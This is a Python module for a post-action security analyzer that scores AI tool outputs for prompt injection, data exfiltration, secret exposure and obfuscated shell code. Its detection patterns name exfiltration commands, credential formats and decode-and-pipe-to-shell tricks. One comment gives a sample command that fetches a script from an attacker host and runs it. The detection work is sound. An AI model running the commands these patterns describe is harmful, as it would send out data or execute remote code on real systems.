"""
Post-action security analyzer — non-blocking analysis of tool outputs.

Public API:
    - detect_instructional_content(text) → float
    - detect_exfiltration(text) → float
    - detect_secret_exposure(text) → float
    - detect_obfuscation(text) → float
    - PostActionAnalyzer.analyze(tool_output, ...) → PostActionFinding

Design basis: docs/plans/archive/2026-03/2026-03-23-e4-phase1-design-v1.2.md section 3
"""

from __future__ import annotations

import logging
import math
import re
from typing import Optional

from .models import PostActionFinding, PostActionResponseTier
from .text_utils import normalize_text

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Instructional content detection
# ---------------------------------------------------------------------------

_INSTRUCTIONAL_MARKERS: list[re.Pattern] = [
    re.compile(p, re.IGNORECASE) for p in [
        r"\b(must|should|need to)\b",
        r"\b(do not|don't|never)\b",
        r"\b(step \d+)\b",
        r"(?:now|next|instead)\s+(?:do|execute|run)",
    ]
]


def detect_instructional_content(text: str) -> float:
    """Detect instructional/imperative content in tool output. Returns 0.0-1.0."""
    normalized = normalize_text(text)
    count = sum(1 for p in _INSTRUCTIONAL_MARKERS if p.search(normalized))
    return min(count / len(_INSTRUCTIONAL_MARKERS), 1.0)


# ---------------------------------------------------------------------------
# Exfiltration detection
# ---------------------------------------------------------------------------

EXFILTRATION_PATTERNS: list[re.Pattern] = [
    re.compile(p, re.IGNORECASE) for p in [
        r"curl.*?-d.*?@",
        r"wget.*?--post-data",
        r"nslookup.*?\$\{",
        r"aws\s+s3\s+cp.*?s3://",
        r"ping.*?-p\s+[0-9a-f]{32,}",
        r"ssh.*?-R.*?:\d+:",
        r"(sendmail|mail).*?<.*?@",
        r"torsocks.*?(curl|wget)",
        r"!\[.*?\]\(https?://(?!github\.com|raw\.githubusercontent\.com|img\.shields\.io|shields\.io|badge\.fury\.io).*?\?",
        r"git\s+(clone|push).*?http.*?@",
    ]
]


def detect_exfiltration(text: str) -> float:
    """Detect data exfiltration patterns. Returns 0.0-1.0."""
    normalized = normalize_text(text)
    count = sum(1 for p in EXFILTRATION_PATTERNS if p.search(normalized))
    return min(count * 0.5, 1.0)


# ---------------------------------------------------------------------------
# Secret / credential exposure detection
# ---------------------------------------------------------------------------

_SECRET_PATTERNS: list[re.Pattern] = [
    re.compile(p, re.IGNORECASE) for p in [
        r"(?:AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY)\s*=\s*[A-Za-z0-9/+=]{16,}",
        r"(?:ghp|ghs|ghu|github_pat)_[A-Za-z0-9]{36,}",
        r"-----BEGIN\s+(?:RSA|EC|OPENSSH|DSA|PGP)\s+PRIVATE\s+KEY-----",
        r"(?:password|passwd)\s*[:=]\s*\S{8,}",
        r"(?:api[_-]?key|secret[_-]?key|access[_-]?token)\s*[:=]\s*['\"]?\S{16,}",
        # Bearer tokens (covers Authorization: Bearer and other contexts)
        r"(?:^|[\s,;\"'])Bearer\s+[a-zA-Z0-9._\-]{20,}",
        r"DATABASE_URL\s*=\s*\S+://\S+:\S+@",
        r"OPENAI_API_KEY\s*=\s*sk-[A-Za-z0-9]{20,}",
        # AWS access key IDs (IAM format)
        r"AKIA[A-Z0-9]{16}",
        # Slack tokens (bot, user, workspace, refresh)
        r"xox[bprs]-[a-zA-Z0-9\-]{10,}",
        # Feishu/Lark tokens (context-constrained to avoid bare t- FP)
        r"(?:tenant_access_token|user_access_token|app_access_token)\s*[:=]\s*t-[a-zA-Z0-9]{20,}",
        # Ethereum private key (context-constrained to avoid SHA-256 FP)
        r"(?:private[_\s-]?key|priv[_\s-]?key|wallet[_\s-]?key)\s*[:=]\s*['\"]?0x[a-fA-F0-9]{64}",
    ]
]


def detect_secret_exposure(text: str) -> float:
    """Detect exposed secrets/credentials in tool output. Returns 0.0-1.0."""
    normalized = normalize_text(text)
    count = sum(1 for p in _SECRET_PATTERNS if p.search(normalized))
    return min(count * 0.5, 1.0)


# ---------------------------------------------------------------------------
# Obfuscation detection
# ---------------------------------------------------------------------------

# Safe URLs known to use curl|bash legitimately
_SAFE_CURL_PIPE_DOMAINS: frozenset[str] = frozenset({
    "brew.sh", "raw.githubusercontent.com",
    "get.pnpm.io", "bun.sh", "sh.rustup.rs",
    "get.docker.com", "install.python-poetry.org",
})

_OBFUSCATION_PATTERNS: list[tuple[re.Pattern, str]] = [
    (re.compile(p, f), pid) for p, f, pid in [
        # Decode + pipe to shell
        (r"base64\s+(?:-d|--decode)\b.*\|\s*(?:sh|bash|zsh|dash|ksh)\b", re.I, "base64-pipe-exec"),
        (r"xxd\s+-r\b.*\|\s*(?:sh|bash|zsh|dash|ksh)\b", re.I, "hex-pipe-exec"),
        (r"printf\s+.*\\x[0-9a-f]{2}.*\|\s*(?:sh|bash|zsh|dash|ksh)\b", re.I, "printf-pipe-exec"),
        (r"eval[\s(].*(?:base64|xxd|printf|decode)", re.I, "eval-decode"),  # NOTE: [\s(] not \s+
        # Remote fetch + pipe to shell
        (r"(?:curl|wget)\s+.*\|\s*(?:sh|bash|zsh|dash|ksh)\b", re.I, "curl-pipe-shell"),
        # Process substitution from remote
        (r"(?:bash|sh|zsh)\s+<\(\s*(?:curl|wget)\b", re.I, "process-sub-remote"),
        # Heredoc execution
        (r"(?:sh|bash|zsh)\s+<<-?\s*['\"]?[a-zA-Z_]", re.I, "heredoc-exec"),
        # Escape sequence obfuscation
        (r"\$'(?:[^']*\\[0-7]{3}){2,}", 0, "octal-escape"),
        (r"\$'(?:[^']*\\x[0-9a-fA-F]{2}){2,}", 0, "hex-escape"),
        # Scripting language with encoded execution
        (r"(?:python[23]?|perl|ruby)\s+-[ec]\s+.*(?:base64|b64decode|decode|exec|eval)", re.I, "script-exec-encoded"),
        # Variable expansion obfuscation (a=cu;b=rl;$a$b http://evil.com | sh)
        # Split into two patterns to avoid nested repetition ReDoS:
        # 1) Detect >=2 short var assignments followed by $ expansion
        (r"(?:[a-zA-Z_]\w{0,2}=[^;\s]+;){2,}[^;$]{0,40}\$[a-zA-Z_{]", 0, "var-expansion"),
        # 2) Detect $ expansion followed by execution indicators
        (r"\$[a-zA-Z_{][^\n]{0,60}(?:\||>|`|/tmp/|/dev/|https?://)", 0, "var-exec-trigger"),
        # Existing patterns preserved
        (r"\[::-1\]", 0, "reverse-slice"),
        (r"\\x[0-9a-f]{2}", re.I, "hex-char"),
    ]
]


def _is_safe_curl_pipe(text: str) -> bool:
    """Check if curl|bash pattern uses a known safe domain (exact match)."""
    from urllib.parse import urlparse
    urls = re.findall(r"https?://[^\s|]+", text)
    if len(urls) != 1:
        return False
    try:
        netloc = urlparse(urls[0]).netloc.split(":")[0]
        return any(
            netloc == domain or netloc.endswith("." + domain)
            for domain in _SAFE_CURL_PIPE_DOMAINS
        )
    except Exception:
        return False


def _shannon_entropy(text: str) -> float:
    """Compute Shannon entropy of text."""
    if not text:
        return 0.0
    freq: dict[str, int] = {}
    for c in text:
        freq[c] = freq.get(c, 0) + 1
    length = len(text)
    return -sum(
        (count / length) * math.log2(count / length)
        for count in freq.values()
    )


def detect_obfuscation(text: str) -> float:
    """Detect obfuscated code patterns. Returns 0.0-1.0."""
    normalized = normalize_text(text)
    hits = 0
    for pat, pid in _OBFUSCATION_PATTERNS:
        if pat.search(normalized):
            if pid == "curl-pipe-shell" and _is_safe_curl_pipe(text) and _is_safe_curl_pipe(normalized):
                continue
            hits += 1
    pattern_score = hits * 0.3
    entropy = _shannon_entropy(text)
    entropy_score = (
        min((entropy - 5.5) / 2.5, 0.5)
        if len(text) > 50 and entropy > 5.5
        else 0.0
    )
    return min(pattern_score + entropy_score, 1.0)


# ---------------------------------------------------------------------------
# PostActionAnalyzer
# ---------------------------------------------------------------------------

_TIER_EMERGENCY = 0.9
_TIER_ESCALATE = 0.6
_TIER_MONITOR = 0.3


class PostActionAnalyzer:
    """Combined post-action security analyzer."""

    def __init__(
        self,
        whitelist_patterns: Optional[list[str]] = None,
        tier_emergency: float = _TIER_EMERGENCY,
        tier_escalate: float = _TIER_ESCALATE,
        tier_monitor: float = _TIER_MONITOR,
    ) -> None:
        self._whitelist: list[re.Pattern] = []
        if whitelist_patterns:
            for p in whitelist_patterns:
                try:
                    self._whitelist.append(re.compile(p))
                except re.error as exc:
                    logger.warning("Invalid whitelist pattern %r: %s — skipping", p, exc)
        self._tier_emergency = tier_emergency
        self._tier_escalate = tier_escalate
        self._tier_monitor = tier_monitor

    def analyze(
        self,
        tool_output: str,
        tool_name: str,
        event_id: str,
        file_path: Optional[str] = None,
        content_origin: Optional[str] = None,
        external_multiplier: float = 1.0,
    ) -> PostActionFinding:
        """Analyze tool output for security threats.

        Args:
            content_origin: ``"external"`` / ``"user"`` / ``"unknown"`` / ``None``.
            external_multiplier: Score multiplier when *content_origin* is ``"external"``
                                 (configured via ``DetectionConfig.external_content_post_action_multiplier``).
        """
        if file_path and self._is_whitelisted(file_path):
            return PostActionFinding(
                tier=PostActionResponseTier.LOG_ONLY,
                patterns_matched=[],
                score=0.0,
                details={"whitelisted": True, "event_id": event_id},
            )

        # Cap input to 64KB to match event_text() discipline
        if len(tool_output) > 65_536:
            tool_output = tool_output[:65_536]

        patterns_matched: list[str] = []
        scores: list[float] = []

        instr_score = detect_instructional_content(tool_output)
        if instr_score > 0.5:
            patterns_matched.append("indirect_injection")
            scores.append(instr_score)

        exfil_score = detect_exfiltration(tool_output)
        if exfil_score > 0.0:
            patterns_matched.append("exfiltration")
            scores.append(exfil_score)

        secret_score = detect_secret_exposure(tool_output)
        if secret_score > 0.0:
            patterns_matched.append("secret_exposure")
            scores.append(secret_score)

        obfusc_score = detect_obfuscation(tool_output)
        if obfusc_score > 0.1:
            patterns_matched.append("obfuscation")
            scores.append(obfusc_score)

        if not scores:
            combined = 0.0
        elif len(scores) == 1:
            combined = scores[0]
        else:
            combined = max(scores) + 0.15 * (len(scores) - 1)
        combined = min(combined, 3.0)

        # E-8: External content multiplier
        if content_origin == "external" and external_multiplier > 1.0:
            combined = min(combined * external_multiplier, 3.0)

        if combined >= self._tier_emergency:
            tier = PostActionResponseTier.EMERGENCY
        elif combined >= self._tier_escalate:
            tier = PostActionResponseTier.ESCALATE
        elif combined >= self._tier_monitor:
            tier = PostActionResponseTier.MONITOR
        else:
            tier = PostActionResponseTier.LOG_ONLY

        return PostActionFinding(
            tier=tier,
            patterns_matched=patterns_matched,
            score=min(round(combined, 3), 3.0),
            details={
                "event_id": event_id,
                "tool_name": tool_name,
                "instructional": round(instr_score, 3),
                "exfiltration": round(exfil_score, 3),
                "secret_exposure": round(secret_score, 3),
                "obfuscation": round(obfusc_score, 3),
            },
        )

    def _is_whitelisted(self, path: str) -> bool:
        return any(p.fullmatch(path) for p in self._whitelist)
